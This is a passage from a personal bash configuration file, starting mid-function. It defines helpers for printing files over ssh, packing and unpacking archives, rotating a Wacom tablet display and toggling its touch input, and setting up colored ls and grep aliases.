            echo 'Pipe file content through ssh.' && \
            cat "$1" | ssh "$login" lpr -P"$printer"
            return $?
        else
            echo "Copy file to server via scp ($login)." && \
            scp "$1" "${login}:/tmp/.sshPrint" && \
            ssh "$login" lpr -P"$printer" ~/.sshPrint
            return $?
        fi
    else
        echo "Given file doesn't exist."
        return $?
    fi
}
unpack() {
    # Unpack archives in various formats.
    #
    # Examples:
    #
    # >>> unpack path/to/archiv.zip
    if [ -f "$1" ]; then
        local command && \
        case "$1" in # switch
            *.tar.bz2|*.tbz2)
                command="tar --extract --verbose --bzip2 --file \"$1\""
                ;;
            *.tar.gz|*.tgz)
                command="tar --extract --verbose --gzip --file \"$1\""
                ;;
            *.bz2)
                command="bzip2 --decompress \"$1\""
                ;;
            *.rar)
                command="unrar x \"$1\""
                ;;
            *.gz)
                command="gzip --decompress \"$1\""
                ;;
            *.tar)
                command="tar --extract --verbose --file \"$1\""
                ;;
            *.zip)
                command="unzip -o \"$1\""
                ;;
            *.Z)
                command="compress -d \"$1\""
                ;;
            *.7z)
                7z x "$1"
                ;;
            *)
                echo  "Cannot extract \"$1\"."
                ;;
        esac
        if [ "$command" ]; then
            echo "Running: [$command]." && \
            eval "$command"
            return $?
        fi
    else
        echo "\"$1\" is not a valid file."
        return $?
    fi
}
pack() {
    # Packs archives.
    #
    # Examples:
    #
    # >>> pack archiv.zip /path/to/file.ext
    # >>> pack archiv.zip /path/to/directory
    if [ -d "$2" ] || [ -f "$2" ]; then
        local command && \
        case "$1" in
            *.tar.bz2|*.tbz2)
                command="tar --dereference --create --verbose --bzip2 --file \"$1\" \"$2\""
                ;;
            *.tar.gz|.*tgz)
                command="tar --dereference --create --verbose --gzip --file \"$1\" \"$2\""
                ;;
            *.bz2)
                command="bzip2 --stdout \"$2\" 1>\"$1\""
                ;;
            *.gz)
                if [ -d "$2" ]; then
                    command="gzip --recursive --stdout \"$2\" 1>\"$1\""
                else
                    command="gzip --stdout \"$2\" 1>\"$1\""
                fi
                ;;
            *.tar)
                command="tar --dereference --create --verbose --file \"$1\" \"$2\""
                ;;
            *.zip)
                if [ -d "$2" ]; then
                    command="zip --recurse-paths \"$1\" \"$2\""
                else
                    command="zip \"$1\" \"$2\""
                fi
                ;;
            *.Z)
                command="compress --stdout \"$2\" 1>\"$1\""
                ;;
            *.7z)
                command="7z a \"$1\" \"$2\""
                ;;
            *)
                echo "Cannot pack \"$1\"."
                return $?
        esac
        if [ "$command" ]; then
            echo "Running: [$command]." && \
            eval "$command"
            return $?
        fi
    else
        echo "\"$2\" is not a valid file or directory."
        return $?
    fi
}
# endregion
# region handle display
loadXINITSources() {
    # This functions loads all xinit source scripts.
    #
    # Examples:
    #
    # >>> loadXINITSources
    local xinitRCPath='/etc/X11/xinit/xinitrc.d' && \
    if [ -d "$XINIT_RC_PATH" ]; then
        for filePath in "${XINIT_RC_PATH}/"*; do
            [ -x "$filePath" ] && source "$filePath"
        done
        unset filePath
    fi
}
setWacomToLVDS1() {
    # This function maps wacom input devices to given rotation.
    #
    # Examples:
    #
    # >>> setWacomToLVDS1 half
    case $1 in none|half|cw|ccw)
        local _SET_WACOM_TO_LVDS1_ROTATE="$1"
        ;;
    '');; *)
        echo -en\
            "Usage: setWacomToLVDS1 [rotate]\nwhere [rotate] is one of\n"\
            "\thalf\tinvert mapping\n"\
            "\tccw\tturn mapping by 90° to the left\n"\
            "\tcw\tturn mapping by 90° to the right\n"\
            "\tnone\treset rotation\n"
        ;;
    esac

    IFS=$'\n'
    for i in `xsetwacom --list devices | cut -f1 | sed 's/ *$//g'`; do
        xsetwacom set "$i" MapToOutput LVDS1
        if [ $_SET_WACOM_TO_LVDS1_ROTATE ]; then
            xsetwacom set "$i" Rotate $_SET_WACOM_TO_LVDS1_ROTATE
        fi
    done
    unset IFS
}
rotateWacomDisplay() {
    # Rotates a wacom display orientation 180°
    #
    # Examples:
    #
    # >>> rotateWacomDisplay
    local _USE="Script to rotate mapping and view of an wacom-display (named output)."

    local _XRANDR_ARG=''
    local _WACOM_ARG=''
    local _OUTPUT='LVDS1'
    local _SELF='rotateWacomDisplay'

    while true; do
        case $1 in
            -h|--help)
            cat <<EOF
$_USE
Usage: $_SELF rotation [output]
Possible rotations are:
-half, --inverted: turn display 180°.
-cw, --right: turn display 90° clockwise.
-ccw, --left: turn display 90° counter-clockwise.
-none, --normal: no rotation.
-n, --next: enable the next rotation as sorted in the list above.
Optionally a valid name for an output listet by xrandr can be given.
EOF
            return 0
        ;;
        -half|--inverted)
            _XRANDR_ARG='inverted'
            _WACOM_ARG='half'
            shift;;
        -cw|--right)
            _XRANDR_ARG='right'
            _WACOM_ARG='cw'
            shift;;
        -ccw|--left)
            _XRANDR_ARG='left'
            _WACOM_ARG='ccw'
            shift;;
        -none|--normal)
            _XRANDR_ARG='normal'
            _WACOM_ARG='none'
            shift;;
        -n|--next)
            local _CURRENT_ROTATION=`xsetwacom --get "Wacom ISDv4 E6 Pen stylus" Rotate`
            case $_CURRENT_ROTATION in
                none)
                "$_SELF" -half;;
            half)
                "$_SELF" -cw;;
            cw)
                "$_SELF" -ccw;;
            ccw)
                "$_SELF" -none;;
            esac
            return $?
            ;;
        -*)
            echo "Error: Invalid argument: $1"
            sh  --help
            return 1
            ;;
        '')
            if [ $_WACOM_ARG ] && [ $_XRANDR_ARG ]; then
                break
            else
                "$_SELF" --next
                return 0
            fi
            ;;
        *)
            _OUTPUT=$1
        shift;;
        esac
    done

    xrandr --output $_OUTPUT --rotate $_XRANDR_ARG
    setWacomToLVDS1 $_WACOM_ARG
    return $?
}
switchFingerTouchWacomEnabled() {
    # Toggles between enabled and disabled finger touch on wacom displays.
    #
    # Examples:
    #
    # >>> switchFingerTouchWacomEnabled
    # >>> switchFingerTouchWacomEnabled enable
    # >>> switchFingerTouchWacomEnabled disable
    if (xinput --list-props 'Wacom ISDv4 E6 Finger touch' | grep \
        'Device Enabled' | cut --fields 3 | grep 1 --quiet && \
        [[ "$1" != enable ]]) || [[ "$1" == disable ]]
    then
        xinput set-prop 'Wacom ISDv4 E6 Finger touch' 'Device Enabled' 0
        return $?
    else
        xinput set-prop 'Wacom ISDv4 E6 Finger touch' 'Device Enabled' 1
        return $?
    fi
}
# endregion
# region terminal color
# Enable color support of ls and also add handy aliases.
if [ -x /usr/bin/dircolors ]; then
    [ -r ~/.dircolors ] && eval "$(dircolors -b ~/.dircolors)" || \
        eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    alias dir='dir --color=auto'
    alias vdir='vdir --color=auto'

    alias grep='grep --color=auto --line-number'
    alias fgrep='fgrep --color=auto --line-number'
    alias egrep='egrep --color=auto --line-number'
fi
# endregion
# region vim modline
# vim: set tabstop=4 shiftwidth=4 expandtab:
# vim: foldmethod=marker foldmarker=region,endregion:
# endregion
